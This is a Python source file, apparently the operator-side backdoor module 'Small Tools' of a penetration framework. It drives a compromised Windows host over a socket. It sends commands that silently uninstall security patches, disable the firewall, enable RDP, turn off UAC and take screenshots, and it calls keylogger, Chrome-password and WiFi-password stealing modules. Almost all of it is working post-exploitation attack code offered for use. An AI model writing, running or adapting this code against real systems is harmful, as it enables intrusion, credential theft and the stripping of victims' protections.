import struct
import os
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from IntranetPenetration.SmallTools import keyboard
from IntranetPenetration.SmallTools import GetChromePassword
from IntranetPenetration.SmallTools import getWIFIPasswords

from AuxiliaryFunctions import MyTable


class SmallTools:
    def __init__(self, conn):
        commands = ["back", "show params", "show functions"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Small Tools] \033[0m')
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer)
                if choice.lower() == 'show functions':
                    self.show_functions()
                    continue
                elif choice == 'back':
                    break
                elif choice == 'show params':
                    self.show_params()
                    continue
                elif choice == "":
                    continue
                elif choice.split()[0] == '1':
                    self.screenshot(choice, conn)
                    continue
                elif choice.split()[0] == '2':
                    self.RemovePatch(conn)
                    continue
                elif choice == '3':
                    self.firewall_stop(conn)
                    continue
                elif choice == '4':
                    self.OpenRDP(conn)
                    continue
                elif choice == '5':
                    keyboard.keyboard(conn)
                    continue
                elif choice == '6':
                    self.closeUAC(conn)
                    continue
                elif choice == '7':
                    GetChromePassword.getChromePassword(conn)
                    continue
                elif choice == '8':
                    getWIFIPasswords.getWIFIPassword(conn)
                    continue
            except KeyboardInterrupt:
                print("exiting......")
                break
            except IndexError:
                print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
                continue
            except:
                continue

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["screenshot_name", "截图的名称"]]
        MyTable.createTable(headers, mydata)

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Small Tools" + '\033[0m' + "\n" + '=' * len("Small Tools") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "screenshot", "1 screenshot_name", "截图"], ["2", "Remove patch", "2", "删除补丁"], ["3", "service iptables stop", "3", "关闭防火墙"],
                  ["4", "Enable RDP", "4", "开启RDP"], ["5", "Keyloggers", "5", "键盘记录器"], ["6", "close UAC", "6", "关闭UAC"],
                  ["7", "Stealing passwords from Google Chrome", "7", "盗取谷歌浏览器的密码"], ["8", "Stealing WiFi passwords", "8", "盗取wifi密码"]]
        MyTable.createTable(headers, mydata)

    # 1
    def screenshot(self, choice, conn):
        command = "screenshot " + choice.split()[1]
        print('\033[1;32;32m' + "[*] start screenshot!" + '\033[0m')
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        srceenshot_time = conn.recv(real_len)
        print('\033[1;32;32m' + "[*] Screenshot completed!The name of the picture is {}.".format(choice.split()[1]) + '\033[0m')

    # 2
    def RemovePatch(self, conn):
        conn.sendall("systeminfo".encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break
        patch = input('\033[1;1;1m' + "Patch number > " + '\033[0m')
        # 会报错.可采用迂回方法处理：发送如下补丁命令，并且把结果输出到1.txt文件，但是不直接接收结果。然后再发送查看1.txt文件的命令.
        patch_command = "wusa /uninstall /kb:" + patch + " /quiet /norestart"
        conn.sendall(patch_command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print('\033[1;32;32m' + result + '\033[0m')
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print('\033[1;32;32m' + result + '\033[0m')
                break

    # 3
    def firewall_stop(self, conn):
        print('\033[1;32;32m' + "[*] Closing firewall!" + '\033[0m')
        command = "netsh advfirewall set allprofiles state off"
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break

    # 4
    def OpenRDP(self, conn):
        command0 = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
        command = "net start TermService"
        conn.sendall(command0.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break
        while True:
            print('\033[1;32;32m' + "[+] usage:username password window_ip" + '\033[0m')
            choice = input("rdesktop > ")
            if choice == "exit":
                break
            elif choice == "":
                continue
            command = "rdesktop -p {} -u {} {}".format(choice.split()[0], choice.split()[1], choice.split()[2])
            os.system(command)

    def receive(self, conn, command):
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break

    def closeUAC(self, conn):
        command = "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break
